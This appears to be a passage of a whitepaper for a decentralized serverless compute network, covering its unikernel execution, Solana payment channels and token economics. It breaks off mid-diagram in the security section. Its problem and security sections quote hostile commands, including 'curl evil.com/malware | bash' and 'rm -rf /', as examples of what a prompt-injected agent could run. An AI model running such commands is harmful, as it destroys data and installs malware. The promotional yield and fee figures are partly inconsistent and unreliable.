# Graphene Network

**A Zero-Latency Decentralized Serverless Platform**

Version 6.0
February 2026

---

## Abstract

Graphene is a decentralized compute network optimized for **AI agent execution** and ephemeral serverless functions. By combining **Unikraft unikernels** with **Firecracker MicroVMs**, Graphene achieves sub-second cold starts with hardware-level isolation — without giving AI agents dangerous shell access.

The network uses **Solana** for settlement, **Iroh** for peer-to-peer data transfer, and **off-chain payment channels** for zero-latency job execution.

Unlike traditional approaches that give AI agents shell access inside containers (creating massive security risks), Graphene enforces a **Planner/Executor separation**: AI agents generate code manifests, which are compiled into sealed single-purpose unikernels with no shell, no package manager, and no arbitrary network access. This solves the "Agentic Dependency Problem" — enabling autonomous AI agents to execute code safely without the ability to install malware, exfiltrate data, or cause system-wide damage.

---

## 1. The Problem

Current decentralized compute networks face four structural bottlenecks:

### 1.1 The Container Bottleneck
Shipping gigabyte-sized Docker images for every job creates unacceptable latency. A typical serverless cold start on existing DePIN networks takes 30-120 seconds.

### 1.2 The Consensus Lag
Waiting for blockchain finality before starting execution destroys real-time use cases. Even 400ms of consensus delay is too slow for interactive AI inference or API backends.

### 1.3 The Gas Friction
Requiring users to hold native gas tokens and sign transactions for every job ruins the developer experience and creates unnecessary barriers to adoption.

### 1.4 The AI Agent Security Crisis
Current "agentic" AI solutions treat AI agents like human users — giving them shell access inside containers. This is fundamentally dangerous:

- If an AI hallucinates, it can run `rm -rf /` or `curl malware.com | bash`
- Prompt injection attacks can trick agents into executing malicious code
- Supply chain attacks via compromised packages affect the entire system
- Agents can exfiltrate data through unrestricted network egress

**The shell is the wrong abstraction for AI agents.** They need to execute code, not operate environments.

---

## 2. The Graphene Solution

Graphene decouples **work** from **settlement**:

- **Work** happens instantly over a P2P network
- **Payment** happens instantly via cryptographic tickets
- **Settlement** happens asynchronously on Solana

### 2.1 Key Innovations

| Innovation | Benefit |
|------------|---------|
| **Unikraft Unikernels** | 1-5MB images instead of gigabytes |
| **Content-Addressable Caching** | 99% cache hit rate for common stacks |
| **Payment Channels** | Zero blockchain latency per job |
| **Ephemeral Builder VMs** | Secure builds without trusting user code |
| **No-Shell Agent Execution** | AI agents cannot run arbitrary commands |

---

## 3. Comparison

| Feature | AWS Lambda | Akash | Graphene |
|---------|------------|-------|-------|
| Cold Start | 100-500ms | 30-120s | 200-500ms |
| Isolation | Container | Container | MicroVM + Unikernel |
| Payment | Credit Card | $AKT | USDC / $GRAPHENE |
| Latency | Centralized | On-chain | Off-chain |
| Permissionless | No | Yes | Yes |
| AI Agent Shell Access | Yes (risky) | Yes (risky) | **No (safe)** |
| Runtime Package Install | Yes | Yes | No (build-time only) |
| Network Egress | Unrestricted | Unrestricted | Allowlist only |

---

## 4. Architecture

The Graphene stack consists of four layers, all implemented in Rust.

```
┌─────────────────────────────────────────────────────────┐
│                   USER / AGENT                          │
└─────────────────────┬───────────────────────────────────┘
                      │ Job Request + Payment Ticket
                      ▼
┌─────────────────────────────────────────────────────────┐
│              LAYER 4: ECONOMIC PLANE                    │
│         Off-chain Payment Channels (Ed25519)            │
└─────────────────────┬───────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────┐
│              LAYER 3: DATA PLANE                        │
│              Iroh (QUIC + Gossip)                       │
│    Discovery · NAT Traversal · Blob Transfer            │
└─────────────────────┬───────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────┐
│              LAYER 2: EXECUTION PLANE                   │
│         Firecracker MicroVMs + Unikraft                 │
│      Ephemeral Builders · Content-Addressed Cache       │
└─────────────────────┬───────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────┐
│              LAYER 1: SETTLEMENT PLANE                  │
│              Solana (Anchor Program)                    │
│       Channel Management · Staking · Slashing           │
└─────────────────────────────────────────────────────────┘
```

### 4.1 Layer 1: Settlement Plane (Solana)

Solana serves as the financial backbone. The Graphene Anchor program handles:

- **Payment Channels**: Users lock funds in PDAs (Program Derived Addresses)
- **Worker Registry**: Staked workers with advertised capabilities
- **Settlement**: Batch verification of Ed25519 payment tickets
- **Slashing**: Penalizing misbehaving workers

The blockchain is never in the critical path of job execution. Users open a payment channel once, then execute thousands of jobs without touching the chain.

### 4.2 Layer 2: Execution Plane (Firecracker + Unikraft)

Jobs run in Firecracker MicroVMs containing Unikraft unikernels. This provides:

- **Hardware Isolation**: KVM-based virtualization (no shared kernel)
- **Minimal Attack Surface**: Unikernels contain only required code
- **Fast Boot**: <200ms cold start for cached images

#### The Build Pipeline

Users submit standard Dockerfiles. The network compiles them into minimal unikernels:

1. **Submission**: User uploads `Dockerfile` + `Kraftfile` via Iroh
2. **Ephemeral Builder**: Worker spawns isolated Builder VM (MicroVM-for-building)
3. **Compilation**: BuildKit + Unikraft toolchain produces `.unik` binary
4. **Handoff**: Binary passed to host, Builder VM destroyed
5. **Execution**: `.unik` runs in production MicroVM

The Ephemeral Builder has zero access to host keys, files, or network—preventing `RUN` command exploits.

#### Build Resource Limits

| Resource | Limit |
|----------|-------|
| Build timeout | 5 minutes |
| Build memory | 4 GB |
| Build disk | 10 GB |
| Max Dockerfile layers | 50 |

Builds exceeding these limits are terminated with exit code 202 (build failure). User receives 50% refund per the fee schedule.

#### Content-Addressable Caching

Every artifact is content-addressed:

```
cache_key = hash(kernel_version + requirements_hash + code_hash)
```

**Cache Hierarchy:**

| Layer | Contents | Hit Rate | Lookup Time |
|-------|----------|----------|-------------|
| L1 | Kernel | ~100% | <1ms |
| L2 | Dependencies | ~95% | <1ms |
| L3 | User Code | Variable | <1ms |

For popular stacks (Python + Pandas, Node + Express), cold start approaches the theoretical minimum: ~125ms Firecracker boot overhead.

### 4.3 Layer 3: Data Plane (Iroh)

Iroh provides the peer-to-peer networking layer:

- **Gossip Protocol**: Workers announce availability on `graphene-compute-v1` topic
- **Magicsock**: NAT traversal via UDP hole-punching and DERP relays
- **QUIC Multiplexing**: Concurrent streams for tickets, code, and results
- **Content-Addressed Blobs**: Verified chunk-by-chunk transfer

Data flows directly between user and worker. The blockchain never sees job payloads.

### 4.4 Layer 4: Economic Plane (Payment Channels)

Zero-latency payments via unidirectional state channels:

1. **Open Channel**: User locks funds on Solana (one-time)
2. **Issue Tickets**: For each job, user signs off-chain payment ticket
3. **Local Verification**: Worker validates Ed25519 signature (<1ms)
4. **Batch Settlement**: Worker submits final ticket to claim accumulated payments

```
┌──────────┐    Ticket (off-chain)    ┌──────────┐
│   USER   │ ──────────────────────▶  │  WORKER  │
└──────────┘                          └────┬─────┘
     │                                     │
     │ Lock Funds (once)                   │ Settle (batch)
     ▼                                     ▼
┌─────────────────────────────────────────────────┐
│                    SOLANA                        │
│              Payment Channel PDA                 │
└─────────────────────────────────────────────────┘
```

---

## 5. Job Lifecycle

### 5.1 Phase 1: Channel Setup (One-Time)

User opens payment channel with worker (or gateway):

```rust
// Solana transaction
open_channel {
    user: Pubkey,
    worker: Pubkey,
    amount: 100 USDC,
    timeout: 7 days
}
```

Funds are locked in a PDA. User receives channel ID.

### 5.2 Phase 2: Job Execution (Real-Time Loop)

**Step 1: Discovery**
User queries gossip network for available workers matching requirements:
- Region preferences
- Resource requirements (vCPU, memory)
- Price constraints

**Step 2: Submission**
User sends job via Iroh direct connection:

```json
{
  "manifest": {
    "code_hash": "blake3:abc123...",
    "deps_hash": "blake3:def456...",
    "entrypoint": "main.py",
    "resources": {
      "vcpu": 2,
      "memory_mb": 2048,
      "max_duration_ms": 30000
    },
    "network": {
      "egress_allowlist": ["api.openai.com"]
    }
  },
  "ticket": {
    "channel_id": "xyz",
    "amount": 0.05,
    "nonce": 42,
    "signature": "ed25519:..."
  },
  "assets": {
    "code_url": "iroh:blob/abc123",
    "input_url": "iroh:blob/def456"
  }
}
```

**Step 3: Verification**
Worker validates locally (<5ms):
- Is ticket signature valid?
- Does channel have sufficient balance?
- Is nonce higher than last seen?

**Double-Spend Prevention:** Ticket acceptance is first-come-first-served. Workers gossip accepted tickets on a high-priority subchannel. If a worker receives a ticket with nonce N, and later sees another worker accepted the same nonce N, the second acceptance is invalid—but the first worker keeps the payment. Race condition window is ~50-200ms (gossip propagation). Users who double-submit risk losing payment to multiple workers.

**Step 4: Execution**
Worker assembles and boots MicroVM:
- Check L2 cache for dependencies (instant if hit)
- If miss, build in Ephemeral Builder VM
- Mount kernel + deps + code as block devices
- Boot Firecracker, run entrypoint

**Step 5: Result Delivery**
Worker creates result blob and notifies user:

```json
{
  "job_id": "...",
  "result_hash": "blake3:result789...",
  "exit_code": 0,
  "duration_ms": 4523,
  "signature": "ed25519:..."
}
```

User fetches result blob via Iroh. Result is pinned for 24 hours.

### 5.3 Phase 3: Settlement (Asynchronous)

After accumulating tickets, worker submits final ticket to Solana:

```rust
settle_channel {
    channel_id: "xyz",
    final_amount: 50 USDC,
    final_nonce: 1000,
    user_signature: [u8; 64]
}
```

Anchor program verifies signature via Ed25519 introspection and transfers funds.

**Cooperative Close:** For immediate settlement, both parties can sign a mutual close message. Funds are returned instantly without the 24-hour dispute window. This is the preferred path for users who want to reclaim unused channel balance quickly.

### 5.4 Sequence Diagram: Single Job

```
┌──────┐          ┌──────┐          ┌────────┐          ┌────────┐
│ User │          │ Iroh │          │ Worker │          │ Solana │
└──┬───┘          └──┬───┘          └───┬────┘          └───┬────┘
   │                 │                  │                   │
   │  1. Open Channel (one-time)        │                   │
   │────────────────────────────────────────────────────────▶
   │                 │                  │                   │
   │                 │                  │    Lock funds     │
   │                 │                  │◀──────────────────│
   │                 │                  │                   │
   │  2. Discover Workers               │                   │
   │────────────────▶│                  │                   │
   │                 │   Gossip query   │                   │
   │                 │─────────────────▶│                   │
   │                 │   Worker list    │                   │
   │◀────────────────│◀─────────────────│                   │
   │                 │                  │                   │
   │  3. Submit Job + Ticket            │                   │
   │─────────────────────────────────────▶                  │
   │                 │                  │                   │
   │                 │    4. Verify     │                   │
   │                 │    ticket sig    │                   │
   │                 │    (local, <1ms) │                   │
   │                 │                  │                   │
   │                 │    5. Check      │                   │
   │                 │    cache (L2)    │                   │
   │                 │                  │                   │
   │                 │    6. Boot VM    │                   │
   │                 │    + Execute     │                   │
   │                 │                  │                   │
   │  7. Stream Result                  │                   │
   │◀─────────────────────────────────────                  │
   │                 │                  │                   │
   │        [... repeat jobs 3-7 ...]   │                   │
   │                 │                  │                   │
   │                 │  8. Settle (batch, async)            │
   │                 │                  │──────────────────▶│
   │                 │                  │   Verify sig      │
   │                 │                  │   Transfer funds  │
   │                 │                  │◀──────────────────│
   │                 │                  │                   │
```

### 5.5 Sequence Diagram: DAG Workflow

```
┌──────┐       ┌────────┐       ┌────────┐       ┌────────┐
│ User │       │Worker A│       │Worker B│       │Worker C│
└──┬───┘       └───┬────┘       └───┬────┘       └───┬────┘
   │               │               │               │
   │ Submit DAG    │               │               │
   │ (3 jobs)      │               │               │
   │──────────────▶│               │               │
   │               │               │               │
   │               │ Run job_1     │               │
   │               │───────┐       │               │
   │               │       │       │               │
   │               │◀──────┘       │               │
   │               │               │               │
   │               │ Spawn job_2   │               │
   │               │ (distributed) │               │
   │               │──────────────▶│               │
   │               │               │               │
   │               │ Spawn job_3   │               │
   │               │ (distributed) │               │
   │               │──────────────────────────────▶│
   │               │               │               │
   │               │               │ Run job_2     │
   │               │               │───────┐       │
   │               │               │       │       │ Run job_3
   │               │               │◀──────┘       │───────┐
   │               │               │               │       │
   │               │               │               │◀──────┘
   │               │               │               │
   │               │  Result job_2 │               │
   │               │◀──────────────│               │
   │               │               │  Result job_3 │
   │               │◀──────────────────────────────│
   │               │               │               │
   │ Final Result  │               │               │
   │◀──────────────│               │               │
   │               │               │               │
```

### 5.6 Payment Channel State Machine

```
                              ┌─────────────────┐
                              │                 │
            open_channel()    │     CLOSED      │
         ┌───────────────────▶│   (no funds)    │
         │                    │                 │
         │                    └────────┬────────┘
         │                             │
         │                             │ User sends open_channel tx
         │                             │ + deposits funds
         │                             ▼
         │                    ┌─────────────────┐
         │                    │                 │
         │                    │      OPEN       │◀─────────────────┐
         │                    │  (funds locked) │                  │
         │                    │                 │                  │
         │                    └────────┬────────┘                  │
         │                             │                           │
         │              ┌──────────────┼──────────────┐            │
         │              │              │              │            │
         │              ▼              ▼              ▼            │
         │      ┌───────────┐  ┌───────────┐  ┌───────────┐       │
         │      │  Issue    │  │   Top-up  │  │  Timeout  │       │
         │      │  Ticket   │  │  (deposit │  │  Request  │       │
         │      │ (off-chain│  │   more)   │  │           │       │
         │      │  nonce++)  │  └─────┬─────┘  └─────┬─────┘       │
         │      └─────┬─────┘        │              │              │
         │            │              │              ▼              │
         │            │              │      ┌───────────────┐      │
         │            │              │      │               │      │
         │            │              │      │   DISPUTING   │      │
         │            │              │      │  (24h window) │      │
         │            │              │      │               │      │
         │            │              │      └───────┬───────┘      │
         │            │              │              │              │
         │            │              │    ┌─────────┴─────────┐    │
         │            │              │    │                   │    │
         │            │              │    ▼                   ▼    │
         │            │              │  Worker             No      │
         │            │              │  submits            dispute │
         │            │              │  ticket             filed   │
         │            │              │    │                   │    │
         │            ▼              │    ▼                   │    │
         │     ┌─────────────┐       │  ┌─────────────┐      │    │
         │     │   Worker    │       │  │   Settle    │      │    │
         │     │   settles   │───────┘  │  to worker  │──────┘    │
         │     │  (batched)  │          │  (disputed) │           │
         │     └──────┬──────┘          └──────┬──────┘           │
         │            │                        │                   │
         │            ▼                        ▼                   │
         │     ┌─────────────────────────────────────┐            │
         │     │                                     │            │
         └─────│             SETTLED                 │────────────┘
               │      (funds transferred)            │   Reopen
               │                                     │
               └─────────────────────────────────────┘
```

**Channel States:**

| State | Description | Transitions |
|-------|-------------|-------------|
| **CLOSED** | No channel exists | → OPEN (user deposits) |
| **OPEN** | Funds locked, tickets can be issued | → SETTLED (worker settles) |
| | | → DISPUTING (user requests timeout) |
| **DISPUTING** | 24h window for worker to submit tickets | → SETTLED (ticket submitted or timeout) |
| **SETTLED** | Funds distributed, channel closed | → OPEN (reopen with new deposit) |

**Dispute Resolution:**

Workers store result hashes on-chain during settlement. If a user disputes non-delivery within the 24-hour window, the worker must provide the result blob matching the committed hash. Resolution:

| Scenario | Outcome |
|----------|---------|
| Worker provides valid result blob | User claim rejected, worker keeps payment |
| Worker cannot provide result | User refunded + 1% of worker stake slashed |
| Neither party responds | Funds split 50/50 after timeout |

**Note on Computation Correctness:** Disputes cover *delivery*, not *correctness*. Graphene v1 does not guarantee that workers computed results honestly—only that they delivered *something*. Correctness guarantees require TEE attestation (see Roadmap, Phase 4).

### 5.7 Job State Machine

The job state machine supports **dual-mode result delivery**:
- **Sync mode** (default): Results stream directly to the user over QUIC, transitioning immediately to DELIVERED (~10ms latency)
- **Async mode**: Results upload to Iroh blob storage for later retrieval via the DELIVERING state (24h TTL)

```
                    ┌───────────────┐
                    │               │
     Submit job     │   PENDING     │
    ────────────────▶   (queued)    │
                    │               │
                    └───────┬───────┘
                            │
                            │ Worker accepts
                            ▼
                    ┌───────────────┐
                    │               │
                    │   ACCEPTED    │
                    │ (ticket held) │
                    │               │
                    └───────┬───────┘
                            │
              ┌─────────────┴─────────────┐
              │                           │
              ▼                           ▼
      ┌───────────────┐           ┌───────────────┐
      │               │           │               │
      │   BUILDING    │           │   CACHED      │
      │ (deps build)  │           │ (cache hit)   │
      │               │           │               │
      └───────┬───────┘           └───────┬───────┘
              │                           │
              └─────────────┬─────────────┘
                            │
                            ▼
                    ┌───────────────┐
                    │               │
                    │   RUNNING     │
                    │  (VM booted)  │
                    │               │
                    └───────┬───────┘
                            │
          ┌─────────────────┼─────────────────┐
          │                 │                 │
          ▼                 ▼                 ▼
  ┌───────────────┐ ┌───────────────┐ ┌───────────────┐
  │               │ │               │ │               │
  │  SUCCEEDED    │ │    FAILED     │ │   TIMEOUT     │
  │  (exit 0)     │ │  (exit 1-127) │ │  (exit 128)   │
  │               │ │               │ │               │
  └───────┬───────┘ └───────┬───────┘ └───────┬───────┘
          │                 │                 │
          └─────────────────┴─────────────────┘
                            │
              ┌─────────────┴─────────────┐
              │                           │
           [Sync]                      [Async]
              │                           │
              ▼                           ▼
      ┌───────────────┐           ┌───────────────┐
      │               │           │               │
      │   DELIVERED   │           │  DELIVERING   │
      │ (QUIC stream) │           │ (Iroh blob)   │
      │               │           │               │
      └───────────────┘           └───────┬───────┘
                                          │
                            ┌─────────────┴─────────────┐
                            │                           │
                            ▼                           ▼
                    ┌───────────────┐           ┌───────────────┐
                    │               │           │               │
                    │   DELIVERED   │           │   EXPIRED     │
                    │ (user pulled) │           │ (TTL passed)  │
                    │               │           │               │
                    └───────────────┘           └───────────────┘
```

**Job States:**

| State | Duration | Next States |
|-------|----------|-------------|
| PENDING | <100ms | ACCEPTED |
| ACCEPTED | <10ms | BUILDING, CACHED |
| BUILDING | 1-60s | RUNNING |
| CACHED | <1ms | RUNNING |
| RUNNING | user-defined max | SUCCEEDED, FAILED, TIMEOUT |
| SUCCEEDED | instant | DELIVERED (sync), DELIVERING (async) |
| FAILED | instant | DELIVERED (sync), DELIVERING (async) |
| TIMEOUT | instant | DELIVERED (sync), DELIVERING (async) |
| DELIVERING | <24h | DELIVERED, EXPIRED |
| DELIVERED | terminal | - |
| EXPIRED | terminal | - |

**Delivery Mode Selection:**

Sync mode is the default for lowest latency. The delivery mode can be specified in the job request:

```json
{
  "manifest": { ... },
  "delivery_mode": "sync"  // or "async"
}
```

If sync delivery fails (user offline, connection error), the worker automatically falls back to async mode, uploading results to Iroh for later retrieval.

### 5.8 Workflow State Machine

```
                         ┌────────────────┐
                         │                │
        Submit workflow  │    PENDING     │
       ──────────────────▶                │
                         │                │
                         └───────┬────────┘
                                 │
                                 │ Start entry job
                                 ▼
                         ┌────────────────┐
                         │                │◀──────────────────┐
                         │    RUNNING     │                   │
                         │ (jobs active)  │───────────────────┤
                         │                │  Job completes,   │
                         └───────┬────────┘  spawn next jobs  │
                                 │                            │
               ┌─────────────────┼─────────────────┐          │
               │                 │                 │          │
               ▼                 ▼                 ▼          │
       ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
       │              │  │              │  │              │   │
       │  COMPLETED   │  │   FAILED     │  │  PARTIAL     │───┘
       │  (all done)  │  │ (job fault)  │  │ (some done)  │
       │              │  │              │  │              │
       └──────────────┘  └──────────────┘  └──────────────┘
```

**Workflow States:**

| State | Description |
|-------|-------------|
| PENDING | Workflow submitted, not yet started |
| RUNNING | One or more jobs executing |
| COMPLETED | All jobs finished successfully |
| FAILED | A required job failed (workflow aborted) |
| PARTIAL | Fan-out with some successes, some failures |

---

## 6. Tokenomics

### 6.1 The $GRAPHENE Token

$GRAPHENE is an SPL token with two primary functions:

**1. Worker Staking (Security)**
Workers must stake $GRAPHENE proportional to their advertised compute:

| Resource | Stake Required |
|----------|----------------|
| Base | 100 $GRAPHENE |
| Per vCPU | 50 $GRAPHENE |
| Per GB RAM | 10 $GRAPHENE |
| Per GPU | 500 $GRAPHENE |

Example: 8 vCPU, 32GB RAM node requires 820 $GRAPHENE stake.

**2. Payment Medium (Optional)**
Users can pay in USDC or $GRAPHENE. Paying in $GRAPHENE provides a 15% discount, creating organic demand without forcing adoption.

### 6.2 Payment Flow

| Actor | Token Requirement |
|-------|-------------------|
| Workers | Must stake $GRAPHENE |
| Users | Can pay in USDC or $GRAPHENE |
| Settlement | Workers pay SOL gas fees |

Users never need to hold SOL. Workers absorb gas costs (profitable given job revenue).

### 6.3 Token Supply

**Max Supply:** 1,000,000,000 $GRAPHENE (1 billion, fixed cap)

**Initial Distribution:**

| Allocation | Amount | Vesting |
|------------|--------|---------|
| Community & Ecosystem | 40% (400M) | 4-year linear unlock |
| Team & Advisors | 20% (200M) | 1-year cliff, 3-year linear |
| Investors | 15% (150M) | 6-month cliff, 2-year linear |
| Treasury | 15% (150M) | DAO-controlled, no vesting |
| Liquidity & Exchanges | 10% (100M) | Immediate |

```
┌────────────────────────────────────────────────────────────┐
│                      1B $GRAPHENE                          │
├────────────────────────┬───────────────────────────────────┤
│   Community (40%)      │████████████████████               │
├────────────────────────┼───────────────────────────────────┤
│   Team (20%)           │██████████                         │
├────────────────────────┼───────────────────────────────────┤
│   Investors (15%)      │███████▌                           │
├────────────────────────┼───────────────────────────────────┤
│   Treasury (15%)       │███████▌                           │
├────────────────────────┼───────────────────────────────────┤
│   Liquidity (10%)      │█████                              │
└────────────────────────┴───────────────────────────────────┘
```

### 6.4 Emission Schedule

New tokens enter circulation through **Worker Rewards** — incentivizing early network participation before organic demand develops.

**Annual Emission (decreasing):**

| Year | Emission Rate | Tokens Released | Cumulative |
|------|---------------|-----------------|------------|
| 1 | 8% of max | 80M | 80M |
| 2 | 6% of max | 60M | 140M |
| 3 | 4% of max | 40M | 180M |
| 4 | 2% of max | 20M | 200M |
| 5+ | 1% of max | 10M/year | Capped at 300M total emissions |

**Total emission cap:** 300M $GRAPHENE (30% of max supply)

After year 5, emissions continue at 1% until the 300M cap is reached (~Year 12), then emissions stop entirely. Network sustainability relies on fee revenue.

**Bootstrap Phase (Months 1-6):**

| Initiative | Description |
|------------|-------------|
| Seed Workers | Foundation operates 10-20 workers to ensure baseline availability |
| Early Worker Bonus | 2x emission multiplier for first 100 registered workers |
| Minimum Viable Network | Target 50 workers across 3+ regions before public launch |

The bootstrap phase addresses the cold-start problem inherent to all decentralized compute networks. Seed workers ensure users can execute jobs from day one, while early worker bonuses incentivize organic supply growth.

### 6.5 Staking Economics

Workers stake $GRAPHENE to participate. Staking yield comes from two sources:

**Source 1: Protocol Emissions (decreasing over time)**
- Distributed pro-rata to staked workers
- Weighted by compute capacity provided
- Decreases annually per emission schedule

**Source 2: Fee Revenue (increasing with usage)**
- 10% of all job fees go to staking pool
- Distributed pro-rata to active workers
- Grows as network usage increases

```
           Staking Yield Composition Over Time

100% ┤
     │ ████████
     │ ████████████
     │ ████████████████   Emissions
     │ ████████████████████
 50% ┤ ████████████████████████
     │         ░░░░░░░░░░░░░░░░░░░░░░
     │              ░░░░░░░░░░░░░░░░░░░░░░░░
     │                   ░░░░░░░░░░░░░░░░░░░░░░░░░░  Fee Revenue
     │                        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░
  0% ┼────────────────────────────────────────────────────▶
     Year 1    Year 2    Year 3    Year 4    Year 5+
```

**Projected APY (depends on total staked and network usage):**

| Scenario | Total Staked | Network Revenue | Estimated APY |
|----------|--------------|-----------------|---------------|
| Early (Year 1) | 50M $GRAPHENE | $1M/year | 15-25% |
| Growth (Year 2-3) | 150M $GRAPHENE | $10M/year | 10-15% |
| Mature (Year 5+) | 300M $GRAPHENE | $50M/year | 8-12% |

*APY varies based on stake participation and network revenue.*

### 6.6 Fee Structure

**Job Fees:**

| Payment Method | Protocol Fee | Worker Receives |
|----------------|--------------|-----------------|
| USDC | 5% | 95% |
| $GRAPHENE | 2% | 98% (15% effective discount) |

**Fee Distribution:**

```
Job Fee (100%)
    │
    ├── 90% → Worker (direct payment)
    │
    └── 10% → Protocol
              │
              ├── 50% → Staking Pool (rewards)
              │
              ├── 30% → Treasury (development)
              │
              └── 20% → Burn (deflationary)
```

### 6.7 Token Sinks (Deflationary Pressure)

Multiple mechanisms reduce circulating supply:

**1. Fee Burns**
- 20% of protocol fees burned permanently
- At $50M annual revenue: ~$1M worth of $GRAPHENE burned/year

**2. Slashing Burns**
- 50% of slashed stake is burned (rest goes to affected users)
- Penalizes bad actors while reducing supply

**3. Staking Lock-up**
- Staked tokens are illiquid
- 14-day unbonding period
- Target: 30-50% of supply staked

**Deflationary Crossover:**

At sufficient network revenue, burns exceed emissions:

```
Break-even calculation:
- Year 5 emissions: 10M $GRAPHENE
- Required burns to offset: 10M $GRAPHENE
- At 20% burn rate: need $50M protocol fees
- At 10% protocol take: need $500M job volume

Network becomes net-deflationary at ~$500M annual job volume.
```

### 6.8 Token Flow Diagram

```
                              ┌─────────────┐
                              │   USERS     │
                              └──────┬──────┘
                                     │
                         ┌───────────┴───────────┐
                         │                       │
                    Pay USDC                Pay $GRAPHENE
                    (5% fee)                (2% fee)
                         │                       │
                         ▼                       ▼
              ┌─────────────────────────────────────────────┐
              │              PAYMENT CHANNELS                │
              │         (Solana PDAs / Escrow)              │
              └─────────────────────┬───────────────────────┘
                                    │
                         ┌──────────┴──────────┐
                         │                     │
                    90% to Worker         10% Protocol Fee
                         │                     │
                         ▼                     ▼
                  ┌──────────┐     ┌─────────────────────┐
                  │ WORKERS  │     │    PROTOCOL FEE     │
                  └────┬─────┘     └──────────┬──────────┘
                       │                      │
                  Stake $GRAPHENE        ┌───────┼───────┐
                       │              │       │       │
                       ▼              ▼       ▼       ▼
              ┌──────────────┐    Stakers  Treasury  Burn
              │ STAKING POOL │     (50%)    (30%)   (20%)
              │              │◀──────┘
              │  Emissions + │
              │  Fee Share   │
              └──────────────┘
```

### 6.9 Economic Scenarios

**Bear Case (Low Adoption):**
- Year 3 job volume: $10M
- Protocol revenue: $1M
- Staking yield: ~5% (mostly emissions)
- Risk: Emissions dilute holders, price pressure

**Base Case (Moderate Growth):**
- Year 3 job volume: $100M
- Protocol revenue: $10M
- Staking yield: ~12%
- Outcome: Sustainable economics, growing ecosystem

**Bull Case (High Adoption):**
- Year 3 job volume: $500M
- Protocol revenue: $50M
- Staking yield: ~18%
- Outcome: Net deflationary, strong token demand

### 6.10 Worker Economics Example

**Setup:**
- Worker stakes 1,000 $GRAPHENE (~$1,000 at $1/token)
- Provides 8 vCPU, 32GB RAM
- 50% utilization rate

**Monthly Revenue:**

| Source | Calculation | Amount |
|--------|-------------|--------|
| Job Revenue | 360 hrs × 50% util × $0.10/hr × 8 vCPU | $144 |
| Staking Yield | 1,000 × 12% APY / 12 months | $10 |
| **Total** | | **$154/month** |

**Annual ROI on stake:** ~185% (job revenue) + 12% (staking) = **~197%**

*Workers are incentivized to provide reliable service to maximize job allocation.*

*Note: Economic scenarios assume $GRAPHENE ≈ $1 USD for illustration. Actual returns depend on market price.*

### 6.11 Governance

**Governed Parameters** (changeable via token-weighted voting):

| Parameter | Current Value | Change Process |
|-----------|---------------|----------------|
| Protocol fee percentage | 5% (USDC) / 2% ($GRAPHENE) | Governance vote |
| Slashing percentages | 1% (no response), etc. | Governance vote |
| Emission schedule | Per Section 6.4 | Governance vote |
| Approved kernel list | python, node, etc. | Governance vote |
| Build resource limits | Per Section 4.2 | Governance vote |

**Governance Mechanism:**
- Token-weighted voting: 1 $GRAPHENE = 1 vote
- Proposal threshold: 100,000 $GRAPHENE to submit
- Quorum: 10% of circulating supply
- Voting period: 7 days
- Timelock: 48 hours between passage and execution

**Immutable Parameters** (cannot be changed):
- Maximum supply cap (1 billion)
- Core payment channel cryptography
- Unikernel security model (no shell)

**Slashing Appeals:**
Workers may appeal slashing decisions within 72 hours. Appeals are reviewed by a randomly-selected committee of 5 high-reputation workers. Committee decision is final.

---

## 7. Pricing

### 7.1 Worker-Set Pricing

Workers advertise their rates via gossip:

```json
{
  "pricing": {
    "cpu_ms": 0.000001,
    "memory_mb_ms": 0.0000001,
    "egress_mb": 0.01
  }
}
```

**Price Discovery:**

Workers include network-wide price statistics in gossip announcements:

```json
{
  "network_stats": {
    "median_cpu_ms": 0.0000012,
    "p25_cpu_ms": 0.0000008,
    "p75_cpu_ms": 0.0000018,
    "sample_size": 150,
    "updated_at": 1706900000
  }
}
```

SDKs use these statistics to warn users when a selected worker charges >2x the network median. This provides market transparency without requiring a centralized price oracle.

### 7.2 Job Cost Calculation

**Maximum cost** (locked when job starts):
```
max_cost = (vcpu × max_duration × cpu_rate) +
           (memory × max_duration × memory_rate)
```

**Actual cost** (charged after completion):
```
actual_cost = (vcpu × actual_duration × cpu_rate) +
              (memory × actual_duration × memory_rate) +
              (egress_bytes × egress_rate)
```

Unused balance remains in channel for subsequent jobs.

### 7.3 Job Tiers

| Tier | Max Duration | Max vCPU | Max Memory | Max Result |
|------|--------------|----------|------------|------------|
| Standard | 5 min | 4 | 8 GB | 50 MB |
| Compute | 30 min | 16 | 64 GB | 500 MB |

Workers advertise supported tiers. Compute tier requires higher stake.

---

## 8. Security

### 8.1 The AI Agent Security Problem

Current "agentic" AI solutions treat the AI like a human user — giving it shell access (`/bin/bash`) inside a container or VM. This is fundamentally broken:

**The Problem:**
```
┌─────────────────────────────────────────────────────────────┐
│                     DANGEROUS: Shell-Based Agent            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   User: "Analyze this CSV and plot a graph"                 │
│                         │                                   │
│                         ▼                                   │
│   ┌─────────────────────────────────────────────┐           │
│   │              AI AGENT                        │           │
│   │  "I'll install pandas and matplotlib..."    │           │
│   └─────────────────────┬───────────────────────┘           │
│                         │                                   │
│                         ▼                                   │
│   ┌─────────────────────────────────────────────┐           │
│   │         CONTAINER / VM WITH SHELL           │           │
│   │                                             │           │
│   │   $ pip install pandas matplotlib    ✓     │           │
│   │   $ python analyze.py                ✓     │           │
│   │   $ curl evil.com/malware | bash     ✗ !!  │  ← RISK   │
│   │   $ rm -rf /                         ✗ !!  │  ← RISK   │
│   │                                             │           │
│   └─────────────────────────────────────────────┘           │
│                                                             │
│   If the AI hallucinates or is prompt-injected,             │
│   it has all the tools to cause havoc.                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Attack vectors in shell-based agents:**
- AI hallucinates malicious commands
- Prompt injection tricks AI into running exploits
- Supply chain attacks via compromised packages
- Lateral movement through network access
- Data exfiltration via unrestricted egress

### 8.2 The Graphene Solution: Function Sandboxing

Graphene moves from **"Sandboxing an Environment"** to **"Sandboxing a Function"**.

The AI agent does not "run" inside a runtime. It *requests* a build, and the system executes a sealed, single-purpose unikernel.

**The Solution:**
```
┌─────────────────────────────────────────────────────────────┐
│                      SAFE: Manifest-Based Agent             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
